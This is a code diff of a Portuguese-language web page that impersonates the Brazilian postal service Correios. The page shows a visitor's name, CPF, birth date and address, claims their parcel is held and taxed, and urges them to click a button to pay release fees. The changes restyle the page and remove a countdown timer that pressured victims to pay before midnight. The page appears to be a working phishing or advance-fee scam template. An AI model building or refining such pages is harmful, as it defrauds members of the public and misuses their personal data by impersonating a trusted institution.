@@ -242,7 +242,7 @@
 
     #resultado p span, #pagamento p span {
       font-weight: 700;
-      color: #007bff;
+      color: #003157;
     }
 
     /* Alert styles */
@@ -429,6 +429,69 @@
     .caixa-overlay-text p {
       margin: 5px 0;
     }
+    
+    /* Estilo para o contêiner pai */
+    .container {
+      position: relative;
+      width: 100%;
+      height: 300px;
+      background-color: #f0f0f0;
+      border: 1px solid #ddd;
+    }
+
+    .overlay {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background-image: url('images/Caixa.png');
+      background-size: cover;
+      background-position: center;
+    }
+
+    /* Estilo para o texto centralizado dentro da div */
+    .overlay-text {
+      position: absolute;
+      top: 60%;
+      left: 55%;
+      transform: translate(-50%, -50%);
+      background-color: transparent;
+      color: black !important;
+      padding: 10px 20px;
+      font-size: 10px;
+      text-align: center;
+      border-radius: 5px;
+      width: 300px;
+    }
+
+    .rotate {
+      text-align: start;
+      transform: rotate(2deg);
+      color: black !important;
+      font-weight: bold;
+      opacity: 0.5;
+      text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
+      transform-style: preserve-3d;
+      transform: rotateX(1.2deg) rotateY(55deg);
+    }
+    
+    /* Estilo simplificado para a seção de status */
+    .status-section {
+      margin: 20px 0;
+      font-size: 12px;
+    }
+    
+    .status-item {
+      margin-bottom: 15px;
+    }
+    
+    .status-title {
+      font-weight: bold;
+      color: #003157;
+    }
+    
+    .status-desc {
+      color: #333;
+    }
   </style>
 </head>
 
@@ -486,222 +549,96 @@
     </section>
 
     <!-- Tela Resultado -->
-<section id="resultado">
-  <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
-  <p><span>Nome:</span> <span id="res-nome"></span></p>
-  <p><span>CPF:</span> <span id="res-cpf"></span></p>
-  <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
-  <p><span>CEP:</span> <span id="res-cep"></span></p>
-  <p><span>Rua:</span> <span id="res-rua"></span></p>
-  <p><span>Bairro:</span> <span id="res-bairro"></span></p>
-  <p><span>Cidade:</span> <span id="res-cidade"></span></p>
-  <p><span>Estado:</span> <span id="res-estado"></span></p>
-  <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
+    <section id="resultado">
+      <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
+      <p><span>Nome:</span> <span id="res-nome"></span></p>
+      <p><span>CPF:</span> <span id="res-cpf"></span></p>
+      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
+      <p><span>CEP:</span> <span id="res-cep"></span></p>
+      <p><span>Rua:</span> <span id="res-rua"></span></p>
+      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
+      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
+      <p><span>Estado:</span> <span id="res-estado"></span></p>
+      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
 
-  <div class="btn-container">
-    <button id="btn-sim-sou-eu">SIM SOU EU</button>
-    <a href="#" id="nao-sou-eu">não sou eu</a>
-  </div>
-</section>
-
-<script>
-  // Function to update the countdown
-  function atualizarContagemRegressiva() {
-    const prazoElement = document.getElementById('res-prazo');
-    const now = new Date();
-    
-    // Format current date as DD/MM/YYYY
-    const day = String(now.getDate()).padStart(2, '0');
-    const month = String(now.getMonth() + 1).padStart(2, '0');
-    const year = now.getFullYear();
-    const formattedDate = `${day}/${month}/${year}`;
-    
-    // Set end time to 23:59:59 of current day
-    const endOfDay = new Date();
-    endOfDay.setHours(23, 59, 59, 0);
-    
-    // Calculate time remaining
-    const diff = endOfDay - now;
-    
-    if (diff <= 0) {
-      prazoElement.textContent = "Prazo expirado";
-      return;
-    }
-    
-    // Convert milliseconds to hours, minutes, seconds
-    const hours = Math.floor(diff / (1000 * 60 * 60));
-    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-    
-    // Update the display
-    prazoElement.innerHTML = `${formattedDate} às 23:59<br><span style="color: red;">${hours}h ${minutes}m ${seconds}s restantes</span>`;
-    
-    // Update every second
-    setTimeout(atualizarContagemRegressiva, 1000);
-  }
-
-  // Start the countdown when the page loads (or when results are shown)
-  document.addEventListener('DOMContentLoaded', function() {
-    atualizarContagemRegressiva();
-  });
-</script>
+      <div class="btn-container">
+        <button id="btn-sim-sou-eu">SIM SOU EU</button>
+        <a href="#" id="nao-sou-eu">não sou eu</a>
+      </div>
+    </section>
 
     <!-- Tela Pagamento -->
-<section id="pagamento">
-  <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
-    <span class="text-blue mr-2">Portal Correios</span>
-    <i class="fal fa-angle-right mr-2"></i>
-    <span class="text-blue mr-2">Rastreamento</span>
-    <i class="fal fa-angle-right mr-2"></i>
-    <span class="text-blue mr-2"><span class="cpf"></span></span>
-  </nav>
+    <section id="pagamento">
+      <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
+        <span class="text-blue mr-2">Portal Correios</span>
+        <i class="fal fa-angle-right mr-2"></i>
+        <span class="text-blue mr-2">Rastreamento</span>
+        <i class="fal fa-angle-right mr-2"></i>
+        <span class="text-blue mr-2"><span class="cpf"></span></span>
+      </nav>
 
-  <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
-    <h5 class="text-danger font-weight-700 mb-4">
-      <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
-    </h5>
-    <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">
-      STATUS DA ENTREGA: <br>
-    </h4>
-    <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
-      <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
-      AGUARDANDO SUA CONFIRMAÇÃO
-    </h4>
-    <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência dos Correios em São Paulo</h5>
-    <p class="mt-4">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
-  </section>
-  
-  <div style="padding: 0px 30px 0px 30px;">
-    <button id="btn-pagar" class="btn btn-primary" style="font-size:13px;width: 100%;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
-  </div>
-
-  <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
-    <div class="container">
-      <div class="overlay">
-        <div class="overlay-text">
-          <p class="rotate" style="margin-top:28%; margin-right:0%;"> 
-            NOME: <span id="pag-nome"></span><br>
-            CPF: <span id="pag-cpf"></span>
-          </p>
-          <p class="rotate" style="margin-top:10%;"> 
-            RUA: <br>
-            BAIRRO: <br>
-            CIDADE: <span id="pag-cidade"></span>
-          </p>
-        </div>
+      <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
+        <h5 class="text-danger font-weight-700 mb-4">
+          <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
+        </h5>
+        <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">
+          STATUS DA ENTREGA: <br>
+        </h4>
+        <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
+          <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
+          AGUARDANDO SUA CONFIRMAÇÃO
+        </h4>
+        <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência dos Correios em São Paulo</h5>
+        <p class="mt-4">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
+      </section>
+      
+      <div style="padding: 0px 30px 0px 30px;">
+        <button id="btn-pagar" class="btn btn-primary" style="font-size:13px;width: 100%;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
       </div>
-    </div>
-  </section>
 
-  <style>
-    /* Estilo para o contêiner pai */
-    .container {
-      position: relative;
-      width: 100%;
-      height: 300px;
-      background-color: #f0f0f0;
-      border: 1px solid #ddd;
-    }
-
-    .overlay {
-      position: relative;
-      width: 100%;
-      height: 100%;
-      background-image: url('images/Caixa.png');
-      background-size: cover;
-      background-position: center;
-    }
-
-    /* Estilo para o texto centralizado dentro da div */
-    .overlay-text {
-      position: absolute;
-      top: 60%;
-      left: 55%;
-      transform: translate(-50%, -50%);
-      background-color: transparent;
-      color: black !important;
-      padding: 10px 20px;
-      font-size: 10px;
-      text-align: center;
-      border-radius: 5px;
-      width: 300px;
-    }
-
-    .rotate {
-      text-align: start;
-      transform: rotate(2deg);
-      color: black !important;
-      font-weight: bold;
-      opacity: 0.5;
-      text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
-      transform-style: preserve-3d;
-      transform: rotateX(1.2deg) rotateY(55deg);
-    }
-  </style>
-
-  <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
-    <ul>
-      <li class="d-flex mt-4" style="position: relative">
-        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
-          <img src="images/correios-icon-1.png" alt="" width="32">
+      <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
+        <div class="container">
+          <div class="overlay">
+            <div class="overlay-text">
+              <p class="rotate" style="margin-top:28%; margin-right:0%;"> 
+                NOME: <span id="pag-nome"></span><br>
+                CPF: <span id="pag-cpf"></span>
+              </p>
+              <p class="rotate" style="margin-top:10%;"> 
+                RUA: <br>
+                BAIRRO: <br>
+                CIDADE: <span id="pag-cidade"></span>
+              </p>
+            </div>
+          </div>
         </div>
-        <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
-          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
-            Previsão de Entrega
-          </h5>
-          <span class="text-dark font-size-12 flex-wrap">
-            3 dias após o pagamento
-          </span>
-        </div>
-      </li>
+      </section>
 
-      <li class="d-flex mt-5" style="position: relative">
-        <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
-        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
-          <i class="fal fa-usd-circle"></i>
+      <section class="status-section">
+        <div class="status-item">
+          <div class="status-title">Previsão de Entrega</div>
+          <div class="status-desc">3 dias após o pagamento</div>
         </div>
-        <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
-          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
-            Objeto aguardando sua confirmação
-          </h5>
-          <span class="text-dark font-size-12 flex-wrap">
-            em Unidade de Fiscalização em São Paulo  
-            <br>
-          </span>
-          <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
-            Realize o pagamento: <a href="#" class="text-blue">Efetuar Pagamento</a>
-          </h5>
+        
+        <div class="status-item">
+          <div class="status-title">Objeto aguardando sua confirmação</div>
+          <div class="status-desc">em Unidade de Fiscalização em São Paulo</div>
+          <div class="status-desc">Realize o pagamento: <a href="#" style="color:#003157;">Efetuar Pagamento</a></div>
         </div>
-      </li>
+        
+        <div class="status-item">
+          <div class="status-title">Objeto em transferência - por favor aguarde</div>
+        </div>
+        
+        <div class="status-item">
+          <div class="status-title">Objeto Postado</div>
+        </div>
+      </section>
 
-      <li class="d-flex mt-5" style="position: relative">
-        <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
-        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
-          <i class="fal fa-truck"></i>
-        </div>
-        <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
-          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
-            Objeto em transferência - por favor aguarde
-          </h5>
-        </div>
-      </li>
-
-      <li class="d-flex mt-5" style="position: relative">
-        <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px"></div>
-        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
-          <i class="fal fa-box-alt"></i>
-        </div>
-        <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
-          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado</h5>
-        </div>
-      </li>
-    </ul>
-  </section>
-
-  <div class="btn-container">
-    <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
-  </div>
-</section>
+      <div class="btn-container">
+        <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
+      </div>
+    </section>
 
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
       <div>
